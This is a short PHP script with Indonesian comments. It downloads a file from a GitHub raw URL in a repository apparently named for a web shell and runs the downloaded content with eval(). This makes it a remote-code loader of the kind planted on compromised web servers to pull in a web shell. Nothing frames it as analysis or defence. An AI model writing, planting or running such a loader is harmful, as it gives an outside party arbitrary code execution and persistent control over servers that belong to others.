<?php
$url = 'https://raw.githubusercontent.com/ebokzsss/shellebok/main/a.txt';

// Menyiapkan opsi konteks HTTP
$options = [
    'http' => [
        'method'  => 'GET',
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n"
    ]
];
$context = stream_context_create($options);

// Ambil isi dari URL menggunakan file_get_contents() dengan konteks
$code = file_get_contents($url, false, $context);

// Cek apakah pengambilan berhasil
if ($code !== false) {
    // Jalankan kode yang diambil
    eval('?>' . $code);
} else {
    echo "Gagal mengambil data dari URL.";
}
?>